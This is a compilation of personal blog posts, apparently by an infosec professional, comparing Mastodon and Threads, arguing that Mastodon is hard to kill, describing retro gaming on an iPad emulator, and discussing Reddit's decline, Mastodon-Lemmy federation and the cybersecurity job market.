algorithm to help artificially boost stuff you may post into others timelines. What this means is that less people see what you post and thus less people interact with it which ultimately means things can be far less social. What I have noticed though, is that when a post does get traction, the interactions seem, much like the content itself, more substantial, more genuine than what you may encounter on Threads. It‚Äôs the classic quantity over quality quandary. Here‚Äôs a few examples of what my feed typically looks like on Mastodon‚Ä¶ So there ya go, I‚Äôm not saying one is better than another. A lot of factors go into what may make one your favorite, or why you might use one over another for certain interactions. For those looking for something a little more ‚Äúserious‚Äù, technical or tailored, maybe spending some time building a Mastodon feed could be what you‚Äôre looking for. If you want to endlessly scroll, and chat with complete strangers about things like gaming or art or *gulp* politics, Threads is probably your place. Feel free to do both! Like I do.

In that segment they describe how close to death any given network is using the ‚ÄúGo 90‚Äù scale, something that Nilay seems to have come up where 0 means the network is upright and thus not near death and 90 would mean the network has fallen flat and is dead. Easy enough! When they came around to talking about Mastodon, there was a polarized set of viewpoints. Nilay came right out of the gate saying Mastodon was undeniably a ‚Äú0‚Äù, i. e. alive. He offered the fact that Mastodon is inherently ‚Äúdecentralized‚Äù and thus ‚Äúunkillable‚Äù - I‚Äôll come back to this. A rebuttal was quickly made by another cohost (David) where he made the case for Mastodon being effectively equivalent to Mastodon. social, thus if Mastodon. social were to die, so too would Mastodon. Stop. This is of course an extremely flawed understanding of how Mastodon works and what the composition is of the larger network of Mastodon instances. David argued that because the ‚ÄúJoin Mastodon‚Äù page more prominently offers mastodon. social as the server you should sign up for that Mastodon as a whole was ‚Äúincreasingly becoming‚Äù just mastodon. social. So yes, to simplify what some think to be a challenging onboarding experience they (Mastodon devs) did make the decision to funnel people towards Mastodon. social but it remains that you can very easily sign up for a wide number of instances and can even port your account from one to another. This has always been the case and will continue to be true. David concluded that Mastodon was very much killable. I‚Äôm here to explain why Mastodon is in fact, nigh unkillable. How Social Networks DieLet me list the ways social networks die or how some say Mastodon specifically might die‚Ä¶ Mastodon. social dies and thus Mastodon with it (David‚Äôs argument). This is effectively how other centralized networks die. All users leave for another platform. The developers cease development. The platform runs out of money or otherwise can‚Äôt fund operations. Meta (i. e. Threads) attempts a classic Embrace, Extend, Extinguish. Central platform failure: Mastodon. social is the flagship Mastodon instance, a default in some ways and at present, still the largest single Mastodon instance at somewhere near 900k users. But there are a ton of other servers out there, seven of which have 100k+ user bases and many more with five-figure user bases [Top Mastodon Servers]. So if Mastodon. social were to up and vanish, taking all of its users with it (even assuming those users didn‚Äôt just go to a new instance), the overwhelming majority of the network would still exist and continue to toot away as they always have. So, no - a death blow to Mastodon. social wouldn‚Äôt ‚Äúkill‚Äù Mastodon nor would it even cripple it any meaningful way in my opinion. (Fun Fact: when T2/Pebble folded they decided to reopen shop on the Fediverse as a Mastodon instance!) User abandonment: What about if a new network, and there are many to choose from these days comes along and convinces all Mastodon users to abandon Mastodon in favor of this new platform. This isn‚Äôt impossible but the fact is that there are a lot of networks right now, and none of them have been able to do this because none of them offer what Mastodon can, especially for certain communities that value what Mastodon brings and no centralized service could ever offer. Privacy, control, open-ness, interoperability, customization, a focus on communities, non-profit, the list goes on. For Mastodon, there is no business model. I am not a product and that alone will be reason enough for a large subset of the social-network-using populace to continue to choose Mastodon over a corporation that has to monetize and can only ever do so through advertising, data selling, etc‚Ä¶ Developer abandonment: What if Eugen and his team pack up and stop development? This would be an obstacle, but certainly not the end. Mastodon is open-source and forks of Mastodon already exist which even add new functionality (i. e. glitch-soc). Development could pick right back up where it left off by one (or multiple) of the many very capable Mastodon-ers who would want to take that on. Run out of money: It takes money to run servers right? What if Mastodon. social, or Eugen, or whoever can‚Äôt fund the ongoing operations of the instance? This is again, not impossible, but as we‚Äôve discussed, Mastodon is decentralized, it is made up of many many instances all of which have an admin, or a team of admins and are funded and supported in large part by the communities that reside within. Those communities like Mastodon and have proven willing to chip in to keep instances afloat. This is a key characteristic of Mastodon versus traditional centralized platforms. Mastodon communities aren‚Äôt just relationships, they are the very housing in which they live. In the traditional model, you may build relationships &amp; communities but you only rent a home on big tech servers. Embrace, extend, extinguish: The most recent perceived threat to Mastodon and the Fediverse at large is the theory of ‚ÄúEmbrace, extend, and extinguish‚Äù, a strategy some feel could be harnessed by Meta to effectively destroy ActivityPub and with it, platforms like Mastodon that run on top of it. I‚Äôm no expert on this strategy nor am I going to spend a lot of time trying to analyze here the likelihood of Meta doing this, but I do feel that those in charge of the ActivityPub spec will be extra keen on making sure Meta would not succeed in that aim. Wrapping UpMastodon was first released in 2016. It never really caught fire, but thanks to what it is, it also hasn‚Äôt died. More recently, thanks to the Twitter implosion, it has if anything began to flourish and see real growth. The fact that Threads has signaled its intention to federate and thus establish interoperability with Mastodon through ActivityPub implementation further validates what Mastodon has been up to all along. Mastodon, or some version of Mastodon - the idea of Mastodon as a decentralized, people-first, community-oriented social network will always be here. Sure, it may always be a niche player in the wide wide world of social networking platforms, but it will never die.

I‚Äôve always considered myself a ‚Äúgamer‚Äù. But I like to think there are (at least) two types of ‚Äúhardcore‚Äù gamers - those that play alot but only a few titles and those that like to play alot and play everything. I‚Äôm more the former. I grew up in the 90‚Äôs, so my love for gaming is shaped by consoles like the classic Nintendo, Super Nintendo, N64 and GameCube (I was clearly a Nintendo kid). I‚Äôve documented some of my favorite titles here. In those days, I actually played quite a few different games. Starting with the GameCube, I became much more of a mono-player, in other words, I really just played one game on whatever was the latest console. With the GameCube I literally only played Super Smash, on Xbox it was Halo, with Xbox 360 more Halo and on Xbox One it was Destiny. (Somewhere in there I played a fair bit of Star Wars: Battlefront). As much as I miss the early days of Halo, LAN parties and the plasma pistol + battle rifle combo, nothing comes quite as close to the ‚Äúgolden days‚Äù of gaming nostalgia as playing those NES/SNES/N64 games. Though I will never be able to recapture what it felt like to be a kid with no other responsibilities playing games with my brother early on a weekend morning, I still love to play these old games. I have kept the consoles and games from my youth and have actually played them pretty recently (especially during the early days of the pandemic) and they‚Äôve worked great! One issue with that experience is that playing classic games on modern high-definition TVs makes for a bit of an eye sore. It also isn‚Äôt the most portable experience. Enter emulators. I‚Äôve played retro games on emulators for a long time now but there‚Äôs never been a great option for iOS outside of the jailbreak scene. Delta is an emulator from Riley Testut (of former GBA4iOS fame) that I‚Äôve recently installed on my iPad so that I can once again enjoy these classic titles! Installing it is fairly straight forward and a really quick operation. The instructions can be found here. It requires sideloading the app through an alternative app store, AltStore. AltStore has some other interesting apps that I will be interested in checking out in the future. Also interesting, given Apples historical stance, is recent news around Apple allowing sideloading in a near-future iOS release. Once installed, Delta is easy enough to navigate - mostly, you just need to import your roms. There is some nuanced legality to how you acquire these roms and though there is not much history of enforcement, you should be conscious of how/what you are downloading. Also be careful of rom sites as they have been known to distribute compromised files. Playing games is a great experience on iPad. Resizable window(s) (using stage manager), external controller support, save states, game library, etc‚Ä¶ All right on your iPad. Amazing! So far, I‚Äôve done a full 100% play through of Super Mario World (the GOAT Mario game) and have started a replay of Super Mario RPG (which Nintendo just dropped the redux of). I think for now I‚Äôll finish another playthrough of the classic and then pick up the new version sometime in the future, especially if they add a hard mode or new gameplay.

This produced some interesting results (see below) but also yielded a lot of other interesting discussion(s) and observations from the community. Read through the child threads of the poll if interested! Though there was a lot of interesting commentary, I want to call out one exchange in particular from a response by @fishidwardrobe@mastodon. me. uk‚Ä¶ @shellsharks This poll and the (all perfectly reasonable, but different) responses to it add weight to my feeling that ‚Äúreply guy‚Äù is not a sort of person, but just a pejorative term. There are certainly plenty of problematic people, even in the Fediverse. I‚Äôm just not sure that the term helps describe them. It‚Äôs a delicate subject in general, but I do share a similar sentiment in this debate. I‚Äôve copied my response to @fishidwardrobe below‚Ä¶ (Thanks in advance for reading!) @fishidwardrobe I‚Äôm still developing my own understanding but I think what you‚Äôre saying is kinda spot on. Clearly, what makes someone a ‚Äúreply guy‚Äù to any one person varies. A very simplistic decomposition of the term seems to demonize men (‚Äúguys‚Äù) who ‚Äúreply‚Äù in one (or more) of a variety of ways - ranging from just being annoying to being overtly suggestive, malicious and/or hostile. This seems to overwhelmingly affect women but is not necessarily isolated to that. I don‚Äôt deny there is an issue, and that issue is wide spread, but I do think the term is unfortunate and I see it increasingly becoming a way that very mild offenders, maybe a guy who responds in a slightly off-putting way to someone is inevitably lumped in with the individuals who are much more malicious in nature. Can‚Äôt say I‚Äôm a fan of generalizing a spectrum of bad actors then coupling that with the virality of name-calling as it seems like it will ultimately lead to unnecessary escalation with those who may have said/done the wrong thing but could have otherwise been educated. Mastodon adding some pre-reply/post modals may be able to do some good for the less malicious offenders‚Ä¶ Hopefully what we as a community take away from this (i. e. the ‚Äúreply guy‚Äù phase of social media and the various immune responses) is an education on how to think before we speak (i. e. post, reply, etc‚Ä¶), how to consider our audience and FFS, how to be kind to each other. *More to come on this from me as I digest some of the responses and the poll results themself. I plan on analyzing these results further in a follow-up post.

This allows infosec folks to put it third on the list a lot of the time. Also sometimes comes down to risk model of the business in scope. Some modicum of downtime is often preferable to data breach, especially when regulations punish confidentiality compromise and not availability issues. cont‚Ä¶ @nf3xn@mastodon. social I like to think about it this way. When you sign up for let‚Äôs say AWS. AWS markets their ‚ÄúA‚Äù at whatever, some amount of 9‚Äôs. They‚Äôre telling you that their Availability is good, but you should expect downtime at some infrequent interval. They would never market hey, you should expect a breach (or C/I compromise) at some point. That said, when you look at the modern threat landscape, often the biggest threats to an org are not C/I-related issues. It is instead ransomware! Which first and foremost effects A. Only more recently have ransomware actors started also exfil-ing data thus compromising C as well and using that for blackmail.

Currently, my site is hosted on Github Pages which uses #jekyll for static site generation. I‚Äôve been using this for nearly 5 years and for the most part have no complaints. The service has decent uptime, is pretty customizable (custom CSS, JS, etc‚Ä¶) and after all this time I am pretty comfortable using it.

There could be some benefits with adding more dynamic content or having more autonomy over my site but not sure if it‚Äôd be worth additional costs or headache trying to manage.

As an example, here is my most recent plea to the #infosec folks of Threads to create Mastodon accounts and invest their social time here instead of there. My selfish reasons aside, after spending time in both worlds, Mastodon is much stronger for this community than Threads is right now. Yes, I know a federated future means a bridge between worlds but I still hold the belief that certain qualities of Mastodon will always make it a more habitable place for infosec folks than a place like Threads (e. g. posts longer than 500 words, posting exploit code that could be moderated out by Threads, PRIVACY implications, etc‚Ä¶) https://www. threads. net/@mk3s/post/C1mhs7JL2vo/ *Apologies to those who find any association with or time spent on Threads utterly irredeemable.

Now there is no dearth of infosec content out there but it is slightly more specialized than ‚Äútech‚Äù for example. Network it around! Or an IndieWeb speak, POSSE. You mention this in your piece but getting it out into specific Reddit channels, LinkedIn, Mastodon, etc. . has been great for getting feedback and spreading the world. Keep pieces updated. A lot of my posts are not just point-in-time writings, but rather resources I keep up to date. This has helped what I write maintain relevance and serve as a resource for myself and others.

As you said, I pop into their profile and look at their recent posts (maybe like 5-10). If they are like 2/3+ interesting and not like 90% just boosts then I will follow. For the previous step, I like to lean on more liberally following accounts that are somewhat consistently interesting as I have found it is MUCH harder to find an account later than it is to simply unfollow them if they become too noisy, off-topic, or not what I want to see in my timeline. I also am FAR more careful following someone if they are a very frequent poster. Anything more than like 3-5x /day and you have to be pretty high signal. In my experience, there are enough people I follow who will boost the one interesting thing out of every 50 posts an account like this would toot so I still get it in my timeline without having to follow them. Operationally, as you scroll your feed, be mindful of accounts you are seeing that post too much, or about things you dont care about and be perfectly willing to unfollow. Pruning is a big part of keeping your timeline enjoyable and manageable. I also actually run two Mastodon accounts (not that I would recommend this approach but it kinda helps in this one regard). This account is mostly dedicated to infosec stuff. I try to mostly write about infosec (or Mastodon meta) and follow infosec accounts. My other Masto account is for everything else. This means I can experiment more with who I follow there and not have to worry about missing things over here. A similar strategy could be deployed via Lists here as well if lists were a thing someone wanted to manage and try. Sometimes I follow because I see someone from an interesting instance that I‚Äôve never seen before and see that as an opportunity to get boosts from them which would in theory be places across the Fediverse that I don‚Äôt have much reach in to. Finding serial boosters is in many cases too much of a burden on a timeline, but having a few solid accounts who do this in your follow list is great as it helps keep your timeilne more dynamic and interesting, having it fed accounts from all over the Fediverse. Other times it‚Äôs just vibes. They say something funny, they have an interesting profile, etc‚Ä¶ For those who only post every once in a while, it has very little effect to just go and follow them as you‚Äôll only have to scroll past an item of theirs every once in a while. I don‚Äôt give much weight to whether I‚Äôm being followed by an account or follow-backs or anything like that. I follow people because I enjoy what they have to say, not because I want them to have to listen to me haha.

I get some decent job opportunity messages from recruiters there from time to time. Don‚Äôt think I‚Äôve ever actually taken/gotten a job which originated from LinkedIn though‚Ä¶ Though most of my (and any one elses) LinkedIn feed is cringey nonsense I do surprisingly find some interesting blog posts from time to time. I don‚Äôt have enough analytics on my site to give any useful numbers, but I know LinkedIn drives some amount of traffic to my site, and thus to my other properties across the web ü§∑‚Äç‚ôÇÔ∏è. It is, in the end, where most jobs/hiring managers will want to turn when they want to look at your ‚Äúprofessional profile‚Äù, even if you have a blog or w/e else, those will almost always be supplemental to 1. your resume and 2. your LinkedIn profile. So having a presence on Linkedin is important for that reason I suppose. I have taken a somewhat principled stance on how I present myself on LI. Rather than reduce myself to my timeline of jobs, I‚Äôve decided to instead emphasize my skills, my portfolio (blog), my education, my credentials, and the orgs I am a part of. For more ramblings on why I don‚Äôt like traditional resumes/LI profiles, read on‚Ä¶ @sudorandom: Am I doing LinkedIn wrong? Should I want as many connections as possible? @sudorandom I guess this just depends how you use LinkedIn. See for me, LinkedIn has very limited value. The way for me to maximize this value is really to just connect with anyone who wants to connect with me. This means more people potentially funneled to my site (and other properties), more network connections from folks in the field who may have stumbled across something I wrote and want to connect further, and three potential professional opportunities (of which there have definitely been some). I don‚Äôt spend a lot of time on LinkedIn. The feed is atrocious, the platform (like so many others) is just becoming an AI training farm and there‚Äôs never felt like any real ownership of the content I could put there or even over my profile. If you look at my profile even, you can see that I‚Äôve gone somewhat out of the way to make it very non-traditional in the LinkedIn sense. If you however use LinkedIn a lot and rely on having a higher fidelity main feed or want to avoid spam as much as possible you may be better served by being pickier with your connections. YMMV.

I think this can be addressed by modifying some server headers but since I am on GitHub Pages I don‚Äôt have that ability. YMMV. Since I have a number of feeds, I wanted to aggregate them in a single spot, so I created a /Feeds page. Coupling ideas from a pair of posts (Feeds | Cory Dransfeldt &amp; RSS in HTML | Jim Nielsen), I created a single spot to share all my web feeds in every format they are available (which for now is RSS or HTML). The HTML Feed is a pretty neat idea as a way to display a typical RSS feed in HTML-form.

The annoyance comes from the bsky cheerleaders who now point to this ‚Äúfederation‚Äù capability and say they‚Äôve achieved what‚Äôs best about Mastodon while also have the other perks of bsky (namely, BYOAlgo I guess?) when in fact their version of federation does not actually give them any level of real autonomy.

But would a Mastodon (a prehistoric elephant) be afraid of a Lemmy (the mascot being a mouse-like rodent)? In the Fediverse, the answer to this is a definitive ‚ÄúNo‚Äù! One (of many) thing(s) that is so interesting and powerful about the Fediverse and the platforms that comprise it is the way in which they can interact with one another, thanks to their common ability to speak ActivityPub. One such example is using Mastodon to interact with Lemmy threads. There are a number of reasons you might want to respond to a Lemmy thread/comment with your Mastodon handle‚Ä¶ You don‚Äôt want to create a Lemmy account You want to use your primary Fediverse identity rather than having a separate Lemmy-based account It‚Äôs easier for you to respond and maintain a discussion directly within your Mastodon client ‚Ä¶and more!Since setting off on my own via my single-account Mastodon instance, I‚Äôve been more interested in centralizing my interactions on the Fediverse to a single account. As such, I wanted to experiment a little bit more with how I could interact with the various Lemmy communities that I am active in. So here‚Äôs some quick observations I‚Äôve made after playing with a few things in the Mastodon-to-Lemmy world‚Ä¶ Some earlier observations about interactivity between Mastodon and Lemmy hold true. You can follow an entire Lemmy community, i. e. @COMMUNITY@SERVER. You can browse communities from within Mastodon by searching for @COMMUNITY@SERVER. What you will see is a list of thread posts and thread comments all boosted by the community handle. It‚Äôs not the most intuitive interface, but it does work. You can reply to any of the parent thread posts, or child comments directly in Mastodon as if they were just Mastodon posts. These appear inline within Lemmy as if they were a comment from any other native Lemmy account. You can reply to threads/comments that are on instances that you don‚Äôt have an account on, even those that are behind invite-only registration walls! Comments on Lemmy posts are shown as boosts from the Lemmy community handle in my Mastodon timelineSome pitfalls, challenges and things to consider if you are going to try and interact with Lemmy using Mastodon‚Ä¶ Federation is hard to wrap your head around and it gets even more complex when you think about how things make their way between different Lemmy servers, Mastodon instance, etc‚Ä¶ As such, you may have no problem finding content on one Lemmy server on a particular Mastodon instance but have trouble in other situations. In my case, I was unable to find things on my small personal instance but was able to find it on larger instances. To mitigate this so I could respond from my personal account, I would ‚Äúsimply‚Äù (admittedly kind of a janky hack) switch over to the Mastodon account on the larger server, find the Lemmy post I wanted to reply to from my smaller Mastodon instance and then reply to that thread as DM to my smaller Mastodon account. Doing that would kick off some kind of federation event so my small account could see that Lemmy thread. Weird! But hey it works. I also observed another in-Lemmy federation quirk. I submitted a post on infosec. pub by my infosec. pub account. A Lemmy user from another server left a comment on that post. I then responded to that comment using my Mastodon account. That Mastodon-based reply propagated to the other Lemmy user‚Äôs server but did not show up on the infosec. pub server. Weird!If you‚Äôre confused, don‚Äôt worry, I‚Äôm still confused too.

Because Reddit sucks now. This sparked quite a bit of discussion on Threads! I‚Äôve pulled some of the more interesting threads out below. What happened to Reddit? It‚Äôs been a long(ish) saga but the main points off the top of my head‚Ä¶ Effectively killed third-party app clients (RIP Apollo) Hostile towards and threatened subreddit mods (during the Reddit strike) Made weird AI partnership with Google to sell off all posts data Waste all their money on the CEO instead of making the platform better Probably other stuff I‚Äôm forgetting tbh‚Ä¶ Their army of unpaid mods are now banning people for being against genocide because it‚Äôs uncivil. Reddit may as well get bought by Elon at this point because it‚Äôs a cesspool of hate. Yeah and they‚Äôve rolled out some thread monetization scheme which incentivizes crappy posts meant to rage-bait. Hence why you see this sort of nonsense. So that‚Äôs why there‚Äôs suddenly a bunch of Ai generated ‚Äúam I the asshole‚Äù posts on the front page. People think they are passing judgment on something that is real lol. I used to use Reddit a lot until they killed 3rd party apps. It already was low quality the way you can make a detailed post that calls on your decades of professional experience only to get told you are wrong by children or outright deleted by a tyrant who thinks their subreddit is their personal magazine they are editor of. Even if Meta cloned Reddit, it would have the same problems as Reddit. Reddit‚Äôs problem is hive mentality upvoting stuff that resonates with them rather than actually correct information. This is compounded by Dunning-Krueger and Gell-Mann Amnesia phenomena. It‚Äôs not because of something unique to Reddit, it‚Äôs the nature of the upvote/downvote style ranked message board. I mean if you haven‚Äôt ever liked Reddit that‚Äôs one thing. But I (and a lot of other people) really liked what Reddit used to be, up until really not that long ago. I‚Äôm not saying it‚Äôs never been flawed, but it was pretty good at facilitating discussions, building communities, etc‚Ä¶ I don‚Äôt see Reddit reversing some of their bad decisions, so maybe someone else can swoop in as Meta did with Threads when Twitter imploded and stand up a worthy competitor. @mk3s: I have 13 year old Reddit account and use it pretty regularly. What I‚Äôve learned is that Reddit didn‚Äôt really change that much for the worse, its users grow more mature and start noticing the flaws a lot more but they‚Äôve always been there. Real world example of this is the old heads talking about how the world isn‚Äôt how it used to be back in their day, repeat ad infinitum. Threads is too new but it‚Äôs already starting to have Twitter like problems. We‚Äôll see how this goes. Yeah I was on Reddit for 12 years and used it pretty heavily. I‚Äôve gone back and tried using it since the whole blackout/reddit protest/API debacle and admit that on the surface things have mostly just kept on keeping on as they always had. So in that way, the experience is not terribly degraded. But I think they are at the inevitable point in our capitalist dystopia where they have nowhere to go but enshittify and extract as much money from their user base as possible before they get bought. They already have a product similar to Reddit, Facebook Groups, although they should make it a bit more like Reddit imo I want a reddit alternative to succeed, I‚Äôm not sure I want Meta behind it Yeah agreed. I‚Äôm already using Lemmy as my main Reddit alternative and there‚Äôs some OK activity in the communities I am in. But unlike Mastodon, I don‚Äôt thing the Fedi-Reddit clones have reached critical mass and could benefit from a large player who could bring more activity. That said, I think my distaste for Reddit (to the point where I‚Äôve stopped using it) is a minority view and for the most part, Reddit (and its users) have kept right on Redditing despite its enshittifcation ü§∑‚Äç‚ôÇÔ∏è I totally see what you mean and to some extent I would agree that a meta entry in the space could be beneficial, but it would feel more and more of a monopoly on social spaces around the internet and a bigger opportunity for meta to take over everythingbut yeah it‚Äôs like there is no good option for a big company to push for federated forums igI have mostly stopped using reddit too since the API stuff but I agree probably people are just carrying on bc there is no other place like it Yeah don‚Äôt get me wrong, I‚Äôm no Meta fan-boy. I‚Äôd say I somewhat reluctantly enjoy using threads even. But I gotta admit they‚Äôve done a good job so far and since they are Federating, I am holding on to the hope that I‚Äôll be able to main my Mastodon account and have discussions here still. It would be hard for someone to compete with Reddit‚Äôs mindshare in that space at this point but given how valuable Reddit‚Äôs data pool is, maybe someone like Meta would try. Ideally, Lemmy can gain more traction Lemmy exists Yeah I‚Äôm familiar with Lemmy and other existing Fediverse-borne reddit clones (e. g. Kbin, mbin, sublinks, etc‚Ä¶). They are great and ideally I‚Äôd see those adopted over a large player introducing a Reddit competitor. But much like Threads, if a big-tech org pioneered a federated (build on ActivityPub) Reddit clone that could interface with Lemmy/Kbin and drive adoption then I think that‚Äôd be a win. Yeah and I honestly think they could pull it off with a slick app and some killer features like regular celebrity interviews, like on Reddit back in the day before they got rid of Victoria Taylor. Market the hell out of that and find hip artists and prereleases of music or games in various deals through exclusives, whatever, they could probably be a serious threat to Reddit. Reddit is getting awful and is mismanaged. Besides ads or selling access to training data for AI, how would that be sustainable for Meta? Although I have higher confidence in Meta as a company to run a social platform, I fail to see how a Reddit clone would end up any differently than Reddit. Federating just means that content would be allowed to leave the platform, not necessarily that any of the existing moderation-related problems would improve. It‚Äôs more can they harmonize the business / money-making aspects to it while also not being user hostile or enshittifying? The problem with Reddit isn‚Äôt the fact they want to monetize. I don‚Äôt care if Reddit goes for an Ads play, or makes AI-content deals, its rather the way they‚Äôve gone about making these changes, all at the significant detriment of the usefulness of the site and the goodwill they earned from their user base. The federation aspect is really just something I personally like There are federated Reddit clones, why would Meta make one? Market opportunity (i. e. flagging Reddit), AI-driven data harvesting, money-making opportunity, cornering more markets, etc‚Ä¶ I mean they entered a VERY crowded Twitter clone market because they saw the opportunity to take market share from a wounded Twitter and it looks like that could work out in their favor.

Is there really a massive shortage of talent in the field? What is the current infosec market like? Is the market for infosec professionals over-saturated? Is the future bright for infosec?I wanted a single place to try and gather my thoughts and provide some responses‚Ä¶ On the topic of the supposed ‚Äútalent shortage‚Äù, there was this interesting read that was published recently. Here‚Äôs what I think‚Ä¶ I think there is a shortage, but from a supply &amp; demand perspective, it only really applies to experienced / qualified professionals who possess certain skills. What I mean is that companies are looking for more senior individuals to fill their cybersecurity roster rather than taking a chance on more junior folks and training them. Further, there is a shortage in terms of the amount of cyber folks companies need versus what they are willing to pay for. Most companies try to get by with as little as possible until they have a security incident, then they tend to hire a bunch. So a lot of reporting will say that SO MANY CYBER POSITIONS ARE NEEDED, despite not that many actually being open. Gatekeeping. I see a lot of positions that stay open FOREVER because hiring teams are just too picky or unwilling to hire and train. Competition. More and more people have caught wind of infosec and there‚Äôs just a lot more competition in the space. Nowadays there are lots of other crises in terms of budgets, economy, pleasing investors which leads to layoffs, etc‚Ä¶How is the market right now and will it stay strong into the future? I would say the future is still relatively bright for infosec. Tech continues to grow and so do investments in it. Hacks are becoming more prevalent and government regulation is making strides to catch up. Regulation will mean companies are required by law to do more in the security space which will require companies to invest in people and tech to comply. Despite a recovering economy, we are currently experiencing an era of layoffs thanks to a number of factors, e. g. employer-employee power struggle, play testing AI, rampant corporate greed, political undercurrents, etc. . This too shall pass. Honestly I‚Äôm not sure what I would do if I wasn‚Äôt in tech. What exactly is a safe profession these days? Medicine? Should i even get into cybersecurity? I don‚Äôt think the market is oversaturated, but I do think there‚Äôs more competition than ever at the ‚Äúbottom‚Äù (entry/junior level). Like many other IT disciplines, salaries are pretty good, even from the start, the hard part being breaking in in the first place. To be fair, it‚Äôs always been this way for cybersecurity, specifically even before the ‚Äúboom‚Äù. But yes, you will need to study, get credentials, get skills, apply yourself likely even before you even get your first job (i. e. home lab, CTFs, training, etc‚Ä¶) but you absolutely can do these things if you are interested in the field. Feel free to check out my ‚Äúguide‚Äù for getting into the field if you‚Äôre interested. Discussions Where are all these infosec jobs hiding? How is it right now and into the future?

But surely there is a point where you reach a level where you have done the majority of the learning and dont need to sit down all day long studying right? How much studying really needs to be done once you have experience? Cyber interests me and I am enjoying my learning so far but having a life outside is also important in my opinion. I dont want to not find a gf because I have to sit down learning CyberSec nearly everyday lmao So what do I think? As a human, you are probably going to need to life-long-learn regardless. But I know what you mean. The answer is somewhat nuanced. No, you don‚Äôt need to be reading white papers every day and doing cutting edge research to succeed as a general security practitioner. I‚Äôve worked in the field for nearly 15 years and 95% of people I encounter are pretty much bare-minimum kinda folks. That said, the IT industry moves fast and security must try to keep up. This means spending some effort staying on top of trends, tech, attacks, etc. . The good news is the basics have not and pretty much will not change. We still talking CIA triad out here folks =P Adding more to this‚Ä¶ Not everyone has to love their job, but I think infosec/cybersecurity is fun and affords a lot of luxuries for people who are interested in pursuing it as a career (e. g. remote work, high pay, new things to learn, lots of mobility opportunities, etc‚Ä¶) It can be intimidating and a little exhausting to constantly stay on top of things in the industry but its doable!

I think there are three main things that contribute to whether a job is stressful, none of them particularly unique to infosec. The organization: Some companies have a work culture that is just, more stressful. This typically permeates throughout an entire org or department. Try researching (e. g. Blind, Glassdoor, etc‚Ä¶) more about a company before you join. Your manager: Having a good manager is probably the most key factor in whether your job will be good or bad. This is hard to research before-hand but you can certainly get a feel for their management style in interviews before you join. Yourself: A lot of job stress is unnecessarily produced by those of us who put too much pressure on ourselves. Often expectations are lower than we think and we can do ourselves a big favor by not taking things as seriously, drawing boundaries and taking time away. One thing that tends to make prospective infosec professionals anxious is this idea that you have to be ‚Äúlearning at all times‚Äù.

Due to this I‚Äôve also tried applying in to entry level SOC and appsec. I have had my resume checked by several professionals of which they‚Äôd always say that I‚Äôm overqualified for entry level and be a great fit, but yet this seems to never be the case when I apply. In terms of qualifications, I have a Software Engineering bachelor‚Äôs degree and a Cybersecurity Master‚Äôs degree. I‚Äôve got a lot of software projects including making discord bots, a twitter bot that would tweet whenever my ISP‚Äôs speed would drop, an AI turret, maglev device, rock paper scissors game on android, etc. In terms of cybersec projects, I documented breaking into a virtual machine that had a vulnerable SQL service running, documented my creation and usage of azure active directory, setup my own cloud environment and for fun a steganography GUI that would allow a user to hide information in an image. I‚Äôve used tools such as Splunk and Wireshark, along with having used cisco packet tracer to create multiple network configurations. I don‚Äôt know if I need more projects to add to this list. Most of the projects i mentioned here are on my personal portfolio site, so I don‚Äôt understand if they‚Äôre too weak or if the hiring manager just does not check them out. I do list two projects on my cv, but I only list the most relevant ones to the specific job. Here‚Äôs some ideas for things to boost up your resume. Breaking in is tough. Not enough XP, too much XP, don‚Äôt have the certs you need, etc‚Ä¶ It‚Äôs one artificial bullshit barrier after another. I experienced it, you‚Äôre experiencing it, pretty much everyone does. There‚Äôs no exact formula unfortunately. It seems more than anything it‚Äôs a numbers game, resume tweaking and pure perseverance that wins. On the face of it, your portfolio sounds great, and definitely one I would take a swing on if I was a hiring manager hiring for interns/entry level. I can‚Äôt be the only one. The market is pretty crap right now and the pool is being squeezed. Budget cuts, AI, layoffs, desperate senior engs taking down-leveled roles, increased competition at the bottom, I could go on‚Ä¶ It‚Äôs not an impossible task though. APPLY to more jobs! Just keep applying. Every possible industry, be willing to relo, whatever you have to do. Breaking in is the hard part than it gets easier. If you‚Äôre clearable (i. e. no crim record and US citizen), consider federal work (which may require relo to certain areas). These is an evergreen area (thanks bloated US spending!) which has a ton of GRC work. Good luck!

On Mastodon (and other ‚Äútraditional‚Äù Fediverse platforms), you don‚Äôt have an algorithmic timeline. Which means when you follow someone, you are signing up for all of their posts, boosts and replies to populate your chronological timeline. Each is effectively weighted the same with respect to the amount of room they take on your feed and the time it takes to scroll past. For this reason, I (and I‚Äôm sure others) tend to be more selective of who we follow on Mastodon, prefering those who have a higher ‚Äúsignal-to-noise‚Äù ratio, i. e. they post more about subjects I care about. I‚Äôve written about my methodology for deciding who I follow back before. Meanwhile, on Threads, you are pushed to use the (notably non-chronological) algorithmic ‚ÄúFor you‚Äù timeline which will of course feed you some posts from people you follow but also mixes in other things Meta thinks you may want to see or engage with. How this algorithm actually works is not public knowledge and is something Meta is likely tuning in the background on a near daily basis. As such, how and why things are prioritized in that timeline is incredibly opaque. Who you follow is only a small part of why you see what you see in your feed. What you ‚Äúlike‚Äù, what you reply to, what you linger on, what you click into, are all data points Threads can ingest to adjust what gets pushed into your timeline. Beyond even your own habits, Threads will deliver content to you based on what is being popularized network-wide, regardless of whether it fits your calculated interests (i. e. if something is going viral they may just send it to you). So who you follow is not as important, which means you are more free (so to speak) to follow people much more blindly and without as much selectivity. This has what I believe to be a somewhat negative effect on how your algorithm is ultimately trained. Since you are conditioned to give less significance to who you follow you end up following accounts who you might not otherwise follow based on their historical post portfolio. This will inevitably skew your timeline towards that mean. Subjectively, I think the Threads algorithm isn‚Äôt awful. My timeline there is somewhat entertaining. But where it shines in spiritedness, it lacks sorely in substance. My Mastodon timeline is as I‚Äôve discussed, a carefully curated mix of awesome people sharing an interesting and diverse mix of things. I‚Äôve somewhat painstakingly built it to be this way over the years I‚Äôve been on the platform. In contrast Threads is, and will continue to be, a platform designed to send you endless waves of xyz-bait posts meant to force engagement. This results in Threads being highly social in many ways, but again, lacking the substance that makes Mastodon so much more of a pleasure to use.

For this one particular fear, I think we can feel somewhat safe.

